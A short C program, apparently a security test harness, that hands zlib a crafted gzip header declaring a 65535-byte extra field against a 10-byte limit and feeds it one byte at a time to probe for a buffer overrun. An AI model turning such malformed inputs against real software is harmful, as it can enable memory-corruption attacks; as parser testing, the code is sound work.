#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "zlib.h"

int main() {
    z_stream strm;
    gz_header head;
    unsigned char input[1024];
    unsigned char output[1024];
    unsigned char *extra = malloc(1024);
    unsigned char *extra_data = malloc(1024);
    if (!extra || !extra_data) return 1;

    // Initialize z_stream
    memset(&strm, 0, sizeof(strm));
    if (inflateInit2(&strm, 16 + 15) != Z_OK) { // 16 + 15 for gzip decoding
        fprintf(stderr, "inflateInit2 failed\n");
        return 1;
    }

    // Setup header
    memset(&head, 0, sizeof(head));
    head.extra = extra;
    head.extra_max = 10; // Back to small extra_max
    if (inflateGetHeader(&strm, &head) != Z_OK) {
        fprintf(stderr, "inflateGetHeader failed\n");
        return 1;
    }

    /*
     * XLEN: ff ff (65535 bytes)
     */
    unsigned char malicious_gzip[] = {
        0x1f, 0x8b, 0x08, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
        0xff, 0xff, // XLEN = 65535
    };

    strm.next_in = malicious_gzip;
    strm.avail_in = sizeof(malicious_gzip);
    strm.next_out = output;
    strm.avail_out = sizeof(output);

    int ret = inflate(&strm, Z_BLOCK); // Use Z_BLOCK to stop right after header
    printf("First inflate (header) returned %d, avail_in: %u\n", ret, strm.avail_in);

    memset(extra_data, 'A', 1024);

    // Feed many small chunks
    for (int i = 0; i < 20; i++) {
        strm.next_in = extra_data;
        strm.avail_in = 1; 
        ret = inflate(&strm, Z_BLOCK);
    }
    printf("After chunks: inflate returned %d, head->extra_len: %u\n", ret, head.extra_len);

    inflateEnd(&strm);
    return 0;
}
